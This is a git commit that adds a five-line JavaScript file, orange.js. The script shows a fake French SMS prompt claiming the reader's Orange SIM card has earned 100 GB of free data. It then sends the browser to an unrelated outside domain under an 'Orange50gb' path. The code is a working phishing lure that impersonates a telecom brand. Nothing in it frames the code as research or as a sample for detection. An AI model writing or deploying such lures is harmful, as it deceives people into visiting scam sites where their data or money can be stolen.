f2d589d0ca6419cb93ec89251d7f0b12451abeee
newetijazz7 <newetijazz7@gmail.com>
2025-09-25 13:58:30 +0100

    Create orange.js

---
+++ orange.js
@@ -0,0 +1,5 @@
+var password = 'Activer 100 Go'
+password=prompt('SMS: Félicitations, votre carte SIM Orange est éligible pour recevoir des données gratuites en récompense de votre ancienne carte SIM, cliquez sur OK pour activer','Activer 100 Go');
+if (password != 'Activer 100 Go') {
+location.href='https://www.jvrrdif.online/Orange50gb';
+}
